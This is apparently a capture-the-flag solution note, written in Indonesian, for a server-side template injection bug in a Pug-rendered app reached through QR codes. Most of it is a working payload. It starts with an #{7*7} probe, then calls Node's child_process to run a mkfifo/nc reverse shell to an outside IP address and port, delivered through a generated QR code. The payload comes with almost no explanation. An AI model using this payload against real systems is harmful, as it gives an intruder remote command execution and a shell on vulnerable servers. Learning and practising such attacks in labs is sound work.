### how to solve

```
bug on pug render (ssti on js)
pakai basic payload ssti #{7*7}

dengan melakukan barcode render pada qr, lalu dipakai untuk scan, lalu lakukan reverse shell dengan payload berikut
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 103.236.140.14 4444 >/tmp/f')}()}

generate dengan qr.
```